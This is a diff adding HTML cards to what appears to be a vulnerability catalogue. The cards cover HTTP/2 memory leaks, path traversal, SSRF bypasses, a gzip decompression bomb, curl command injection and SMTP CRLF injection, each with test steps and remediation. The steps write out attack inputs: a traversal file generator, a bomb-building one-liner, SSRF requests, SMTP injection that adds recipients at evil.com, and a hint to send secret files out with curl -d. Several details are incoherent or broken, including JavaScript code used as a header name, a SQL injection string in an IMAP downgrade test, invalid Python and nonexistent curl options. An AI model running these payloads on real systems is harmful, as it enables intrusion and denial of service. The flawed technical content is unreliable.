+<li>Initiate an HTTP/2 connection to &lt;TARGET<em>HTTP2</em>SERVER&gt;.</li>
+<li>Continuously send WINDOW_UPDATE frames on stream 0.</li>
+<li>Use a large window size for the WINDOW_UPDATE frame, for example, a size of 65535.</li>
+<li>Repeat step 2 and 3 for an extended period of time (e.g., several minutes or hours).</li>
+<li>Monitor the server&#x27;s memory usage.  The memory usage should progressively increase, indicating a memory leak.</li>
+<li>Observe if the server becomes unresponsive or crashes due to excessive memory consumption.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> The exploitation of this memory leak can result in a denial-of-service condition. The server may become unresponsive or crash due to resource exhaustion, impacting legitimate users.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement proper memory management practices within the HTTP/2 server implementation. Ensure that memory allocated for WINDOW<em>UPDATE frames is properly tracked and released when no longer needed. Thoroughly review and test the handling of WINDOW</em>UPDATE frames, particularly on stream 0, to prevent memory leaks.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Source Code">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Source Code</span>
+          <span class="card-title-text">File Permissions Bypass via chmod/chown</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A vulnerability exists where improper handling of file permissions during modification allows for bypassing intended access controls. This can potentially lead to unauthorized modifications or access to sensitive files, compromising system integrity. The root cause is insufficient validation of user-supplied parameters affecting file permissions.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Construct a Node.js script that utilizes functions related to file permission modification, such as <code>chmod</code> and <code>chown</code>, accepting user-supplied paths and permission values as input.</li>
+<li>Pass a crafted file path as input that attempts to manipulate file permissions beyond the intended scope or to target system-level directories.</li>
+<li>The crafted file path should attempt to bypass checks intended to prevent modification of sensitive system files.  For example, a path like <code>/..;/path/to/target</code> might be attempted.</li>
+<li>Provide permission values that could result in unintended privilege escalation, such as attempting to set permissions to <code>777</code>.</li>
+<li>Execute the script and observe whether the file permissions are modified as expected, or if there is a bypass of intended access controls.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized modification of file permissions can lead to privilege escalation, data breaches, or denial of service, depending on the specific files targeted and the permissions granted.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust input validation and sanitization for any user-supplied parameters related to file paths and permissions. Strictly limit the scope of file operations based on user privileges and enforce access control checks to prevent unauthorized modifications. Use secure coding practices to prevent unintended consequences from user input.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Network">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Network</span>
+          <span class="card-title-text">Denial of Service via Malicious Header Name</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows a remote attacker to cause a denial-of-service (DoS) condition by sending a specially crafted HTTP request with a malicious header name. The header name, when processed by the application, triggers a <code>TypeError</code> in the Node.js process, ultimately leading to a crash and service unavailability. The core issue lies in improper handling of header names, allowing unexpected characters or patterns to trigger internal errors.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Send an HTTP request to &lt;TARGET_URL&gt; using a tool like <code>curl</code> or <code>Postman</code>.</li>
+<li>Include a custom header with a name designed to trigger a <code>TypeError</code>. Specifically, use a header name that tries to modify the prototype chain (e.g., <code>req.<strong>proto</strong>.toString = function() { return 1; }</code>).</li>
+<li>The request should look like this:</li>
+</ol>
+<pre><code>   curl -H &quot;req.__proto__.toString = function() { return 1; }&quot; &lt;TARGET_URL&gt;</code></pre>
+<ol>
+<li>Observe the server’s response and system behavior. The application is expected to crash due to the <code>TypeError</code>.</li>
+<li>Verify that the server becomes unresponsive or requires a restart to recover from the crash.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can exploit this vulnerability to cause a denial-of-service (DoS) condition, rendering the application unavailable to legitimate users. The crash may also lead to data loss or corruption depending on the application’s state at the time of the error.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust header name validation and sanitization. The server should reject or normalize header names that contain unexpected characters or attempt to modify the prototype chain. Use a secure header parsing library and ensure it is up-to-date with the latest security patches.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Source Code">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Source Code</span>
+          <span class="card-title-text">UDS Server Binding Bypass</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> The Node.js UDS (Unix Domain Socket) server binding functionality allows listening on a socket without proper permission checks when using the UDS protocol. This bypass can occur when the <code>--allow-net=false</code> flag is not used, enabling potentially unauthorized access to resources and services exposed via the UDS server.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Compile and execute a Node.js script that binds to a Unix Domain Socket (UDS) without the <code>--allow-net=false</code> flag.</li>
+<li>The script should utilize the <code>net</code> module to listen on the UDS socket.</li>
+<li>The UDS socket file path can be specified as a parameter in the script (e.g., <code>/tmp/&lt;SOCKET_FILE&gt;</code>).</li>
+<li>Attempt to connect to the UDS server from a different user or process that lacks the necessary permissions to access the socket file.</li>
+<li>Successful connection demonstrates the bypass.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized processes or users may be able to connect to and interact with services exposed via the UDS server, potentially leading to privilege escalation or data compromise.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Always enforce strict permission checks when binding to UDS sockets. Ensure the <code>--allow-net=false</code> flag is implemented to restrict network access during UDS server binding to prevent unauthorized access. Implement robust access controls for the socket file itself.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Source Code">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Source Code</span>
+          <span class="card-title-text">Timing Side-Channel in HMAC Verification</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability exposes a timing vulnerability during the verification of HMAC signatures. The vulnerability arises from an implementation detail that allows an attacker to infer information about the secret key based on the time taken to verify a crafted HMAC signature. This can lead to the forgery of valid MACs, allowing an attacker to compromise data integrity and potentially escalate privileges.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Observe the time taken for HMAC verification on a target system.</li>
+<li>Craft multiple HMAC signatures with slight variations in the message digest.</li>
+<li>Measure the time taken to verify each crafted signature.</li>
+<li>Analyze the timing differences to extract information about the secret key used in the HMAC generation.</li>
+<li>Use the acquired key information to forge valid HMAC signatures.</li>
+</ol>
+<p>For example, the memcmp() function can be optimized in a way that the time it takes depends on the key.</p>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can potentially forge valid HMAC signatures, leading to data compromise, unauthorized access, or privilege escalation depending on the application’s usage of the HMAC mechanism.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement constant-time comparison functions (e.g., using bitwise operations instead of <code>memcmp()</code>) to prevent timing variations during HMAC verification. Utilize hardware-accelerated cryptographic primitives where available to mitigate timing attacks and ensure consistent verification times.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Source Code">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Source Code</span>
+          <span class="card-title-text">File Existence Disclosure via realpathSync.native Permission Model Bypass</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> The <code>realpathSync.native</code> function, when used with insufficient permissions, can inadvertently expose information about the existence of files outside the intended directory, potentially revealing sensitive file paths or internal directory structures. This occurs because the function resolves symbolic links and traverses directories, which can lead to unexpected information disclosure if access controls are not properly enforced.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Create a symbolic link (<code>symlink</code>) outside the intended working directory that points to a sensitive file (<code>sensitive_file</code>).</li>
+<li>Attempt to resolve the path of the symbolic link using <code>realpathSync.native</code> with a limited user or process that lacks direct read access to the <code>sensitive_file</code> but can access the <code>symlink</code>.</li>
+<li>Observe the resolved path returned by <code>realpathSync.native</code>.  If the function successfully resolves the symbolic link to the <code>sensitive_file</code>, despite the lack of permissions on the target file, this indicates a potential information disclosure vulnerability.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can leverage this vulnerability to infer the existence and potentially the location of sensitive files or directories within a system, even without direct access permissions to those files. This information can be used to plan further attacks or to identify potential targets for exploitation.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong>  Implement rigorous access control checks before invoking functions like <code>realpathSync.native</code>. Ensure the user or process executing the code has the necessary permissions to access all files and directories that may be traversed during path resolution.  Consider using alternative approaches that avoid traversing potentially inaccessible file systems.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Network">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Network</span>
+          <span class="card-title-text">Path Traversal via Prefix Containment Check</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows an attacker to write files outside the intended output directory by manipulating the file name used by a tool. The tool constructs file paths based on user-controlled input and then attempts to validate the output path, but this validation is insufficient, allowing for traversal to unintended locations.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Create a malicious input file containing a crafted file name. This file name should include path traversal sequences (e.g., <code>../</code>) to navigate to a different directory.</li>
+</ol>
+<pre><code>name = b&#x27;../out_pwn/evil.proto&#x27;
+with open(&#x27;evil.bin&#x27;, &#x27;wb&#x27;) as f:
+    f.write(bytes([0x0a, len(name)]) + name + b&#x27;\x00&#x27;)</code></pre>
+<ol>
+<li>Create a directory structure that facilitates the path traversal. This involves creating an output directory and a sibling directory where the attacker intends to write the file.</li>
+</ol>
+<pre><code>mkdir -p /tmp/out /tmp/out_pwn</code></pre>
+<ol>
+<li>Execute the tool with the crafted input file and a specified output directory. This will trigger the path traversal.</li>
+</ol>
+<pre><code>/path/to/tool -file evil.bin -output /tmp/out</code></pre>
+<ol>
+<li>Verify that the file has been written to the unintended location within the sibling directory.</li>
+</ol>
+<pre><code>ls /tmp/out_pwn</code></pre>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can overwrite or create arbitrary files outside the intended output directory, potentially leading to integrity compromise of adjacent project artifacts or other sensitive data. This can lead to unauthorized modification or deletion of files and compromise the confidentiality and integrity of the system.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust path validation to prevent path traversal vulnerabilities. This includes using safe path joining functions that properly handle parent directory references, ensuring that output paths are always within the intended directory boundaries and enforcing secure file creation practices. Sanitize user-provided input and validate it against a whitelist of allowed characters and paths.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">SSRF Bypass via Unblocked NAT64 Local-Use Prefix</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows an attacker to bypass server-side request forgery (SSRF) filters by exploiting a misconfiguration in how IPv6 addresses are classified. Specifically, a NAT64 local-use prefix (64:ff9b:1::/48) is not correctly blocked, allowing requests to internal services or resources accessible under that prefix to be treated as safe, effectively bypassing SSRF protections. This can lead to unauthorized access to sensitive data or systems.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Set up a testing environment with an SSRF-vulnerable endpoint at &lt;TARGET_URL&gt;/fetch.</li>
+<li>Create a secondary container capable of manipulating network configurations (e.g., using <code>NET_ADMIN</code> capabilities).</li>
+<li>Within the secondary container, add a NAT64 local-use IPv6 address (e.g., 64:ff9b:1::7f00:1) to the loopback interface using a command like: <code>ip -6 addr add &lt;IPV6_ADDRESS&gt;/128 dev lo</code></li>
+<li>Start a local HTTP service on the assigned NAT64 local-use IPv6 address (e.g., 64:ff9b:1::7f00:1:18081), serving a simple response.</li>
+<li>Verify that the service is accessible from within the secondary container using the NAT64 local-use IPv6 address.</li>
+<li>Attempt a request through the SSRF endpoint using the NAT64 local-use address as the target: <code>curl -sS &#x27;&lt;TARGET<em>URL&gt;/fetch?url=http://[&lt;IPV6</em>ADDRESS&gt;]:&lt;PORT&gt;&#x27;</code>.</li>
+<li>If the request is allowed instead of blocked, the vulnerability is confirmed. The response body will contain the server response.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized access to internal services, exposure of sensitive data, and potentially reconnaissance or pivoting within the internal network.  Exploitation could allow an attacker to reach services that are intended to be inaccessible from the outside.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong>  Ensure accurate classification of IPv6 address ranges, specifically including the NAT64 local-use prefix <code>64:ff9b:1::/48</code> in the blacklist of unsafe addresses.  Thoroughly validate IP addresses used in SSRF requests, differentiating between public and private addresses and adhering to stricter addressing policies. Regularly review and update address blacklists and security configurations.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">API</span>
+          <span class="card-title-text">Unbounded GZIP Decompression Leading to Event-Loop Starvation</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability arises when a client (e.g., a server-side application) uses a library like libcurl to fetch content with compression enabled. An attacker can exploit this by providing a highly compressed payload that expands to an extremely large size, causing the decompression process to consume excessive CPU resources and block the event loop, leading to a denial-of-service (DoS) condition for other network operations. This issue stems from a lack of bounds checking or yielding during the decompression process.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Create a server that serves a dynamically generated gzip compressed payload. This payload should be designed to expand to a significantly large size (e.g., 100 GB) when decompressed.</li>
+<li>Use a command-line tool or client library (e.g., <code>curl</code> with <code>--compressed</code>) to fetch the gzip compressed payload from the attacker-controlled server and discard the resulting content (e.g., redirecting it to <code>/dev/null</code>).</li>
+<li>Monitor the CPU utilization of the process fetching the payload. Observe if the CPU core becomes completely locked at 100% utilization during the decompression process.</li>
+<li>As an example payload, consider a gzip file containing repeated sequences of zeros. For instance, <code>b&#x27;0&#x27; <em> (1024 </em> 1024)</code> for each segment.</li>
+</ol>
+<pre><code>python3 -c &#x27;import gzip, io, sys; buf = io.BytesIO(); with gzip.GzipFile(fileobj=buf, mode=&quot;wb&quot;, compresslevel=9) as f: f.write(b&quot;0&quot; * (1024 * 1024) * 100000); print(buf.getvalue())&#x27; &gt; bomb.gz
+time curl --compressed http://&lt;TARGET_URL&gt;/bomb.gz -o /dev/null</code></pre>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can trigger a denial-of-service (DoS) condition, potentially affecting the availability of backend services, automated crawlers, webhooks, or headless systems that rely on the vulnerable library for fetching compressed data.  The entire thread dedicated to handling network requests can be blocked, preventing other legitimate requests from being processed.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust decompression bounds checking in the library or client code.  Ensure that decompression operations yield control back to the event loop periodically to prevent CPU starvation. Consider limiting the maximum allowable decompression size and providing a configuration option to disable compression entirely if necessary. Use memory-mapped files for decompression to avoid loading the entire expanded content into memory at once, further mitigating resource exhaustion.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Network">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Network</span>
+          <span class="card-title-text">HTTP/2 Push Scheme Validation Bypass via OOM</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows a malicious HTTP/2 server to bypass scheme validation when pushing resources, potentially leading to the client processing content as if it originated from a secure origin. The bypass occurs when memory allocation fails during header processing, leading to the suppression of a critical header and subsequent circumvention of the security check. This condition can be triggered under memory pressure conditions.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Configure a client application to enable HTTP/2 push functionality.</li>
+<li>Initiate a connection to a server over a plaintext (non-HTTPS) connection.</li>
+<li>The server sends a PUSH_PROMISE frame containing a large number of headers to induce memory pressure on the client.</li>
+<li>The <code>:scheme</code> pseudo-header allocation fails due to the induced memory pressure, resulting in its silent dropping.</li>
+<li>Observe if the subsequent push is accepted without the scheme validation check.</li>
+<li>Use the following example payload to simulate the issue: Simulate a memory allocation failure during the processing of the <code>:scheme</code> header.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> A malicious server can bypass scheme validation and push resources, potentially causing the client to process content as if it originated from a secure origin. This can lead to data security compromises or other vulnerabilities depending on the nature of the pushed resource.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Ensure that memory allocation failures during header processing are handled properly. Return a failure code (e.g., <code>NGHTTP2<em>ERR</em>CALLBACK_FAILURE</code>) to abort the operation and prevent the bypass. Implement robust error handling and memory management practices to avoid allocation failures under stress.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">SSL/TLS Identity Leakage via Connection Reuse</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability arises when a library (like libcurl) improperly reuses established SSL/TLS connections. If a connection is configured with specific security parameters (like client certificates for authentication) and then reused by a subsequent request that lacks those same parameters, the second request can inadvertently operate under the identity of the first, leading to authentication bypass and unauthorized access. This is a critical issue in applications that handle multiple user identities or sensitive data.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Configure an HTTPS server requiring client certificate authentication.</li>
+<li>Initiate a first transfer (Handle 1) using a custom SSL context function (<code>CURLOPT<em>SSL</em>CTX_FUNCTION</code>) to load a valid client certificate, establishing a secure connection authenticated with a specific client certificate.</li>
+<li>Initiate a second transfer (Handle 2) to the same host and port without specifying any client certificate or SSL context callback.</li>
+<li>Observe that the library reuses the connection established by Handle 1. This can be verified by checking the number of connections established during Handle 2, expecting a low number or zero.</li>
+<li>Verify that the server accepts the second request as authenticated under the identity of the client certificate used in Handle 1, effectively bypassing authentication.</li>
+</ol>
+<pre><code>Example payload for initial connection setup:
+curl --ssl-ctx-file &lt;PATH_TO_CLIENT_CERT_FILE&gt; &lt;TARGET_URL&gt;</code></pre>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker could potentially hijack authenticated sessions, gain unauthorized access to sensitive data, perform actions on behalf of another user, or bypass access controls by leveraging the reused connection with the original identity. This represents a significant risk of identity theft and privilege escalation.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Ensure that connection reuse mechanisms correctly validate that all necessary security parameters (e.g., client certificate context, authentication configurations) match between the original and reused requests. Store and compare the full set of SSL/TLS configuration details when managing connections, rather than relying on a subset. Utilize secure connection management practices and thoroughly review connection pooling implementations.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">API</span>
+          <span class="card-title-text">Unauthenticated SSRF via Public Reference API</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows an unauthenticated attacker to make Server-Side Requests (SSRF) to internal resources by manipulating a publicly accessible reference API endpoint. The API endpoint, intended for sharing data, can be exploited to send requests to arbitrary internal URLs, potentially exposing sensitive information or allowing unauthorized access to internal services.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Construct a URL for the public reference API endpoint. The URL will contain a parameter that accepts a reference string.  For example: <code>&lt;TARGET_URL&gt;/api/v1/reference?ref=&lt;PARAMETER&gt;</code></li>
+<li>Craft a malicious payload for the <code>&lt;PARAMETER&gt;</code> that points to an internal resource.  Example payloads include internal IP addresses or service URLs. <code>http://&lt;INTERNAL<em>IP&gt;</code> or <code>http://&lt;INTERNAL</em>SERVICE&gt;</code></li>
+<li>Send a GET request to the constructed URL with the malicious payload in the <code>&lt;PARAMETER&gt;</code>.</li>
+<li>Monitor the response from the API endpoint. If the SSRF is successful, the response will contain the content retrieved from the internal resource specified in the <code>&lt;PARAMETER&gt;</code>.</li>
+<li>Verify that no authentication is required to trigger the SSRF.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An unauthenticated attacker can exploit this vulnerability to access internal resources, potentially leading to information disclosure, unauthorized access to internal services, or even remote code execution if the internal services are vulnerable.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement strict input validation and sanitization on the reference parameter to prevent attackers from injecting arbitrary URLs.  Validate that the referenced URL resolves to an expected domain or protocol.  Enforce authentication or authorization checks on the API endpoint to prevent unauthenticated access. Implement a allowlist of approved domains or IP addresses that can be accessed via the reference API.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">API</span>
+          <span class="card-title-text">Command Injection via Custom Curl Wrapper</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability arises from the use of a custom script or wrapper around the <code>curl</code> command that mishandles user-supplied input, allowing for arbitrary command execution. The issue occurs when user input is directly concatenated into a <code>curl</code> command without proper sanitization or validation, leading to the injection of malicious commands.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Observe that a custom curl wrapper accepts input for a non-standard flag (e.g., <code>-guid</code>).</li>
+<li>Craft a malicious payload that combines a valid-looking value with shell metacharacters to inject arbitrary commands. For example, <code>123 -o /tmp/evil</code>.</li>
+<li>Construct the full command using the custom wrapper: <code>curl -guid 123 -o /tmp/evil -url &lt;TARGET_URL&gt;</code>.</li>
+<li>Observe that the <code>curl</code> command executes the injected command, overwriting <code>/tmp/evil</code> with the content of <code>&lt;TARGET_URL&gt;</code>.</li>
+<li>Test other injection vectors such as using <code>-d</code> to send secret files externally.</li>
+<li>Test the ability to inject <code>--engine</code> to load a shared object file.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized modification of system files, information disclosure through exfiltration of sensitive data, and remote code execution (RCE) on the affected system are potential impacts of this vulnerability. This can lead to a complete compromise of the system hosting the vulnerable application.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong>  Avoid executing shell commands with user-provided data. Instead, use language-specific libraries like libcurl that provide a safe and controlled way to construct <code>curl</code> requests and pass arguments directly without involving a shell interpreter. If shell execution is unavoidable, use input validation with regular expressions to strictly limit the allowable characters and format of the user input. Consider using the <code>--terminator</code> option to prevent further options from being interpreted as arguments to the URL.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Network">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Network</span>
+          <span class="card-title-text">Authentication Policy Bypass via Connection Reuse</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability arises from a flaw in connection reuse logic where authentication policy requirements are not properly verified against existing connections. This allows a transfer to proceed with a weaker authentication method than requested, potentially bypassing security controls and compromising confidentiality or authentication strength. The flaw occurs because the mechanism identifier is ignored during connection matching.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Initialize a shared connection pool using a connection sharing mechanism.</li>
+<li>Perform a first transfer to a server using a weak authentication mechanism. For example, using IMAP: <code>imap://&lt;USER&gt;:&lt;PASSWORD&gt;;AUTH=PLAIN@&lt;TARGET_URL&gt;/</code>. Ensure the connection is established and added to the pool.</li>
+<li>Perform a second transfer to the same server, requesting a stronger authentication mechanism. For example, using IMAP: <code>imap://&lt;USER&gt;:&lt;PASSWORD&gt;;AUTH=GSSAPI@&lt;TARGET_URL&gt;/</code>.</li>
+<li>Observe that the second transfer proceeds despite requesting a stronger authentication method, and that the stronger authentication is not actually used. A payload of <code>&#x27; OR &#x27;1&#x27;=&#x27;1</code> could be injected into the username or password field to verify the bypass.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong>  This vulnerability can lead to a downgrade in authentication strength, allowing unauthorized access or data exposure. In shared environments, this can facilitate lateral movement and compromise the security posture of multiple tenants. The authentication policy explicitly defined by the developer is silently ignored.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement a mandatory comparison of the authentication options (e.g., SASL mechanisms, SSH authentication types) during connection matching. Ensure that any connection reused must satisfy the security policy of the incoming request. Properly validate that the authentication method requested during connection establishment matches the requirements of subsequent connections.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">API</span>
+          <span class="card-title-text">SMTP Command Injection via CRLF in MAIL_FROM/MAIL_RCPT</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> The SMTP functionality allows attackers to inject arbitrary SMTP commands by manipulating CRLF sequences within user-controlled <code>MAIL<em>FROM</code> or <code>MAIL</em>RCPT</code> parameters. This vulnerability arises from insufficient sanitization of control characters within parsed email addresses, allowing crafted input to be interpreted as additional SMTP commands. The core issue is a lack of consistent input validation in the SMTP command processing.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Start a local SMTP listener to capture the raw SMTP traffic. For example: <code>nc -l -p &lt;SMTP<em>PORT&gt; &gt; /tmp/smtp</em>raw.txt &amp;</code>.</li>
+<li>Construct a <code>curl</code> request using the <code>MAIL<em>FROM</code> option, injecting CRLF sequences followed by an arbitrary SMTP command. For example: <code>curl --url &quot;smtp://&lt;SMTP</em>HOST&gt;:&lt;SMTP_PORT&gt;&quot; --mail-from &quot;$&#x27;&lt;user@domain.com&gt;\r\nRCPT TO:&lt;injected@evil.com&gt;&#x27; --mail-rcpt &quot;legit@example.com&quot; --upload-file /dev/null&quot;</code></li>
+<li>Alternatively, craft a <code>curl</code> request injecting commands via the <code>MAIL<em>RCPT</code> option: <code>curl --url &quot;smtp://&lt;SMTP</em>HOST&gt;:&lt;SMTP_PORT&gt;&quot; --mail-from &quot;sender@legit.com&quot; --mail-rcpt &quot;$&#x27;&lt;legit@x.com&gt;\r\nRCPT TO:&lt;injected@evil.com&gt;&#x27; --upload-file /dev/null&quot;</code></li>
+<li>Inject a full SMTP transaction by crafting the <code>MAIL<em>FROM</code> parameter to include <code>RCPT TO</code>, <code>DATA</code>, <code>Subject</code>, and the email body, separated by CRLFs.  Example:  <code>curl --url &quot;smtp://&lt;SMTP</em>HOST&gt;:&lt;SMTP_PORT&gt;&quot; --mail-from &quot;$&#x27;&lt;user@domain.com&gt;\r\nRCPT TO:&lt;x@evil.com&gt;\r\nDATA\r\nSubject: injected\r\n\r\ninjected body\r\n.&#x27; --mail-rcpt &quot;legit@x.com&quot; --upload-file /dev/null&quot;</code></li>
+<li>Inspect the captured traffic using <code>cat /tmp/smtp_raw.txt</code> to verify that the injected SMTP command is executed as intended.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can exploit this vulnerability to inject arbitrary SMTP commands, potentially leading to unauthorized recipient addition, manipulation of the SMTP transaction flow, injection of email content (headers and body), and subsequent abuse for spam, phishing, or data exfiltration.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong>  Implement consistent input validation for all parsed email address components, rejecting or sanitizing control characters (e.g., \r, \n).  Ensure the same sanitization logic (like REJECT_CTRL) is applied to all relevant input paths to prevent injection vulnerabilities. Use secure coding practices to ensure user-supplied data is always properly validated and sanitized before being incorporated into any command execution.</p>
+      </div>
+    </article>
+    
+
